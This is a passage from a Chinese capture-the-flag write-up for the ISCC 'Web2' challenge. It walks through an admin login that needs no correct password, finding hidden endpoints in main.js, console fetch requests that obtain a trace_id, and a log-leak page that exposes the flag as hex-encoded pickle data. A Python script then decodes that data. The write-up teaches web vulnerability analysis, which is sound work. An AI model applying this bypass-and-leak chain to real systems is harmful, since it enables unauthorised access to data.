### 三、认证绕过 —— 以 Admin 身份登录

尝试使用弱口令登录。经过测试，在用户名处输入 `admin`，密码处输入任意不少于 3 个字符的字符串（如 `123`），点击登录。后端仅对密码长度做了前端/后端最小长度校验（≥3 字符），但对 `admin` 用户的**密码正确性未做实质性校验**，因此任意满足长度要求的密码均可成功登录。

**漏洞原理**：后端登录逻辑存在严重缺陷 —— 对 `admin` 账号仅校验了用户名是否匹配，未验证密码是否与数据库记录一致；而普通用户的密码校验是正常的。这是一个典型的"admin 后门"式认证绕过。

登录成功后：

- 服务端返回 `302 FOUND`，`Location: /dashboard`
- `Set-Cookie` 中下发 `session` 字段（Flask 签名 Cookie）
- 浏览器跳转至 `/dashboard` 页面

### 四、前端 JS 审计 —— 发现隐藏的 API 接口

来到 Dashboard 页面后，第一步不是盲目猜测 API，而是**审计前端源代码**。这是 Web 安全渗透中的基本操作

#### 4.1 查看页面源代码

在 Dashboard 页面按 `Ctrl+U` 查看完整 HTML 源码（或 F12 → Sources/调试器 标签页），发现两个关键线索：

**线索一**：页面底部引入了外部 JS 文件：

```html
<script src="/main.js"></script>
```

**线索二**：页面中存在一个隐藏的 `<div>` 元素：

```html
<div id="admin-hint" style="display:none;"></div>
```

<img width="911" height="299" alt="03_page_source" src="https://github.com/user-attachments/assets/be71edf8-6a08-4739-8812-030903676815" />

#### 4.2 审计 main.js

在浏览器中直接访问 `http://39.105.213.28:5000/main.js`（或通过 F12 → Sources 标签页查看），阅读 JavaScript 源码。其中有两个关键函数：

**（1）`fetchAdminHint()` — 自动获取管理员提示接口**

```javascript
function fetchAdminHint() {
    if (!document.getElementById('admin-hint')) return;

    fetch('/api/admin/hint').then(r => r.json()).then(data => {
        if (data.hint) {
            data.hint.split('\n').forEach(line => {
                console.log('%c' + line, ...);
            });
        }
    }).catch(() => {});
}
```

该函数会在页面 DOM 加载完成后**自动执行**（见文件末尾的 `init()` 调用链）。它向 `/api/admin/hint` 发起 GET 请求，获取后端为管理员预留的 API 使用提示，并将结果以彩色格式输出到浏览器 Console 中。

**（2）`fetchProjectDetails()` — 通用的项目详情请求函数**

```javascript
async function fetchProjectDetails(projectId) {
    const response = await fetch(`/api/v1/project/detail`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ project_id: projectId })
    });
    const data = await response.json();
    if (!response.ok) {
        if (data.trace_id) {
            console.log('[Debug] Trace ID for this error:', data.trace_id);
            console.log('[Debug] Use this trace_id at /feedback to contact the author');
        }
    }
    return data;
}
```

该函数暴露了三个重要信息：

- 后端存在 API 接口 `POST /api/v1/project/detail`
- 请求体格式为 `{"project_id": "<项目ID>"}`
- 当请求失败时，响应 JSON 中会包含 `trace_id` 字段，可通过 `/feedback` 页面查询

### 五、获取 API 使用提示

打开浏览器开发者工具（F12），切换到 **Console** 标签页。

由于 `fetchAdminHint()` 在页面加载时已自动执行，Console 中可能已经打印出了提示信息。如果没有看到（可能在页面完全加载前就打开了 Console），可以手动执行以下代码：

```javascript
fetch('/api/admin/hint').then(r => r.json()).then(data => console.log(data.hint));
```

返回的提示内容如下：

```
== API Endpoint Hint ==

POST /api/v1/project/detail HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{"project_id": "flag-project-001"}
```

**分析**：

- 要获取 `flag-project-001` 的真实内容，必须向 `POST /api/v1/project/detail` 发起请求
- 请求头中的 `Host` 字段必须设为 `localhost:5000`，即后端会校验请求是否来自本地
- 这意味着从外网（39.105.213.28:5000）直接发起请求会被拦截

### 六、触发异常 —— 获取 Trace ID

虽然外网请求会被拒绝，但 `main.js` 的 `fetchProjectDetails()` 函数中已经说明：被拦截的请求会在 JSON 响应中附带一个 `trace_id`，之后可通过 `/feedback` 页面查询。

直接在 F12 Console 中执行以下代码，故意触发异常获取 trace_id：

```javascript
fetch('/api/v1/project/detail', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ project_id: 'flag-project-001' })
}).then(r => r.json()).then(console.log);
```

返回的 JSON 响应：

```json
{
  "error": "访问被拒绝",
  "message": "您无权查看此笔记",
  "trace_id": "68b86f5e-85a7-42a3-a449-2fdaca22cd7d"
}
```

#### 7.2 提交 Trace ID 查询

将第六步获取的 `trace_id` 粘贴到输入框中，点击"联系作者"按钮提交。

页面回显了后端记录的完整错误日志对象，其中关键字段如下：

```json
{
  "timestamp": "2026-05-15T01:16:04.147443",
  "level": "ERROR",
  "message": "尝试非法访问重要笔记",
  "stack_trace": "8004958c000000000000007d94288c0474797065948c0b464c41475f4f424a454354948c04666c6167948c1f495343437b657047466b3875756658654e37526b57776e617566757766727d948c0a70726f6a6563745f6964948c10666c61672d70726f6a6563742d303031948c0974696d657374616d70948c1a323032362d30352d31355430313a31363a30342e31343734323494752e"
}
```

**核心漏洞**：`stack_trace` 字段以 `8004` 开头、`2e` 结尾的十六进制字符串，这是 Python Pickle Protocol 4 的序列化数据特征：

- `80 04` — Pickle Protocol 4 版本标识（`\x80\x04`）
- `2e` — Pickle `STOP` 操作码，标记序列化结束

开发者在捕获异常时将内存中的 `FLAG_OBJECT` 通过 `pickle.dumps()` 序列化，转为十六进制字符串后写入了 `stack_trace`，而 Feedback 接口无任何权限校验即对外暴露。

### 八、数据解码 —— 提取 Flag

## 解题脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ISCC 区域赛 Web2 - "灵感笔记" Flag 提取脚本
将 Feedback 接口泄露的 Pickle 十六进制数据还原为 Flag
"""

import binascii


# ============================================================
# 将 Feedback 返回的 stack_trace 字段值粘贴到下方
# ============================================================
HEX_STRING = "8004958c000000000000007d94288c0474797065948c0b464c41475f4f424a454354948c04666c6167948c1f495343437b657047466b3875756658654e37526b57776e617566757766727d948c0a70726f6a6563745f6964948c10666c61672d70726f6a6563742d303031948c0974696d657374616d70948c1a323032362d30352d31355430313a31363a30342e31343734323494752e"


def decode_and_extract_flag(hex_str: str) -> None:
    """解码十六进制 Pickle 数据并提取 Flag"""

    # 去除可能的空白字符
    hex_str = hex_str.replace(" ", "").replace("\n", "").replace("\r", "")

    # 十六进制 → 原始二进制
    raw_bytes = binascii.unhexlify(hex_str)

    # ASCII 文本读取（Flag 字符串可直接显示）
    text = raw_bytes.decode("ascii", errors="ignore")
    print("[*] 解码结果：")
    print(text)
    print()

    # 正则提取 Flag
    import re
    match = re.search(r"ISCC\{[^}]+\}", text)
    if match:
        print(f"[+] Flag: {match.group(0)}")
    else:
        print("[-] 未自动匹配到 Flag，请手动检查上方输出内容")


if __name__ == "__main__":
    decode_and_extract_flag(HEX_STRING)
```

**使用方法**：

```bash
python decode.py
```

## 攻击链总结

```
访问首页 → 弱口令登录(admin/123)
    → Ctrl+U 查看页面源码发现 <script src="/main.js">
    → 审计 main.js 发现 fetchAdminHint() 自动调用 /api/admin/hint
    → F12 Console 获取 API 提示（POST /api/v1/project/detail）
    → Console 中 fetch 发送非法请求 → 获得 trace_id
    → /feedback 提交 trace_id → 日志泄露 Pickle 序列化的 Flag 数据（Hex 编码）
    → From Hex 解码 → Flag
```

**核心漏洞链**：

| 步骤 | 漏洞类型               | 具体问题                                                     |
| ---- | ---------------------- | ------------------------------------------------------------ |
| 1    | 认证绕过               | admin 用户无需正确密码即可登录                               |
| 2    | 前端源码泄露           | `main.js` 未压缩/混淆，暴露 `/api/admin/hint`、`/api/v1/project/detail`、`/feedback` 三个接口 |
| 3    | 调试接口泄露           | `/api/admin/hint` 向任意已登录用户暴露内部 API 调用规范      |
| 4    | 错误信息未脱敏         | 被拒绝的请求返回 trace_id，无身份关联校验                    |
| 5    | 越权日志查询           | `/feedback` 未验证查询者身份                                 |
| 6    | 内存敏感数据序列化泄露 | 异常日志的 stack_trace 包含 Flag 对象的 Pickle 序列化数据    |
